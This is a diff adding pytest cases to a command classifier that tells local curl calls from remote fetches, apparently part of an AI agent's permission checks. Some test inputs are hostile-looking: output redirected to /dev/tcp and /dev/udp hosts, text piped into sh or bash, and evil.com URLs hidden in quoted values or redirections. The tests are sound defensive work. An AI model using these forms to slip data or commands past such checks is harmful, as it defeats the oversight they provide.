@@ -71,6 +71,81 @@ def test_the_same_flags_on_a_remote_call_are_still_refused(engine, command):
     assert _followup(engine, command)
 
 
+@pytest.mark.parametrize("command", [
+    # Seen in demo runs, every one refused as a follow-up fetch although every URL in it is on this machine.
+    "curl -s http://localhost:11434/api/tags 2>&1",
+    "curl -s http://localhost:11434/api/tags 2>nul",
+    "curl -s http://localhost:11434/api/tags 2>&1 | head -c 2000",
+    "curl -s http://localhost:11434/api/version 2>nul || echo \"ollama not running\"",
+    "(curl -s http://localhost:11434/api/tags)",
+    "echo \"=== API ===\" && (curl -s http://localhost:11434/api/tags 2>&1 | head -c 2000 || echo \"no api\")",
+    "curl -s -m 5 http://localhost:11434/api/tags; echo \"---EXIT:$?---\"",
+    "curl -s -X POST http://localhost:11434/v1/systemone -H \"Content-Type: application/json\" "
+    "-d \"{\\\"model\\\":\\\"tev1:4b\\\",\\\"state\\\":\\\"x\\\"}\"",
+    "curl -s http://localhost:11434/v1/systemone -d \"{\\\"model\\\":\\\"tev1\\\"}\"",
+    "cd /d E:\\work && curl -s -X POST http://localhost:11434/v1/systemone -H \"Content-Type: application/json\" "
+    "-d \"{\\\"model\\\":\\\"tev1:4b\\\"}\"",
+    "curl -s -i -X POST http://localhost:11434/v1/systemone -H \"Origin: http://localhost:8765\" "
+    "-d \"{\\\"model\\\":\\\"tev1:4b\\\"}\" --max-time 60 | findstr /i \"HTTP access-control choice\"",
+    "curl -s http://127.0.0.1:8000/ > out.html",
+    "curl -s http://localhost:8000/ >> log.txt 2>&1",
+])
+def test_redirects_groups_escaped_quotes_and_status_echoes_on_a_local_call_are_not_a_search_follow_up(engine, command):
+    assert not _followup(engine, command)
+
+
+@pytest.mark.parametrize("command", [
+    "curl -s https://pokeapi.co/api/v2/pokemon/garchomp 2>&1",
+    "curl -s https://pokeapi.co/api/v2/pokemon/garchomp 2>&1 | head -c 2000",
+    "(curl -s https://example.com/ || echo no)",
+    "(curl -s https://example.com/ 2>&1 | head -c 100)",
+    "curl -s http://localhost:8000/ 2>&1 https://example.com/",                          # a remote URL beside a local one
+    "curl -s http://localhost:8000/ -d \"x \\\"https://evil.com/\\\"\"",                 # a remote URL inside the quoted value
+    "curl -s http://localhost:8000/ >https://evil.com/x",                                 # one hidden in a redirection
+    "curl -s http://localhost:8000/ -H \"Origin: http://localhost:3000\"; wget https://example.com/",
+    "curl -s http://localhost:8000/ | findstr /i \"ok\" && curl https://example.com/",
+    "curl -s http://localhost.evil.com/x 2>&1",
+    "curl 2>&1 | head -c 10",                                                             # no URL at all
+    "curl -s http://localhost:8000/$(echo x)",                                            # a substitution is still unproven
+    "curl -s http://localhost:8000/$TARGET",
+])
+def test_the_same_forms_on_a_remote_call_or_with_a_substitution_are_still_refused(engine, command):
+    assert _followup(engine, command)
+
+
+@pytest.mark.parametrize('command', [
+    'echo "curl example.com" | sh; curl http://localhost:8000/',
+    'printf "wget example.com" | bash; curl http://localhost:8000/',
+    'printf "wget example.com" | command bash; curl http://localhost:8000/',
+    'echo "curl example.com" | cmd /c; curl http://localhost:8000/',
+    'curl http://localhost:8000/ > /dev/tcp/example.com/80',
+    'curl http://localhost:8000/ > /dev/udp/example.com/53',
+])
+def test_a_local_url_does_not_excuse_executable_text_or_network_redirection(engine, command):
+    assert _followup(engine, command)
+
+
+@pytest.mark.parametrize('command', [
+    'curl http://localhost:8000/dev/tcp/status',
+    "curl -d '/dev/tcp/example.com/80' http://localhost:8000/",
+])
+def test_network_device_text_in_a_path_or_literal_payload_is_not_a_redirection(engine, command):
+    assert not _followup(engine, command)
+
+
+@pytest.mark.parametrize('platform', ['win32', 'linux'])
+@pytest.mark.parametrize('command,remote', [
+    ('(curl -s http://localhost:8000/ 2>&1) | grep "HTTP status"', False),
+    ("curl -H 'Content-Type: application/json' -d '{\"fixture\":true}' http://localhost:8000/", False),
+    ('curl http://localhost:8000/; echo "exit: $?"', False),
+    ('echo "curl example.com" | command sh; curl http://localhost:8000/', True),
+    ('curl http://localhost:8000/ > /dev/tcp/example.com/80', True),
+])
+def test_local_shell_proofs_under_both_lexer_modes(engine, monkeypatch, platform, command, remote):
+    monkeypatch.setattr(engine.sys, 'platform', platform)
+    assert _followup(engine, command) is remote
+
+
 def test_commands_that_are_not_fetches_are_unaffected(engine):
     for command in ("python app.py", "node --check app.js", "dir", "which curl"):
         assert not _followup(engine, command)
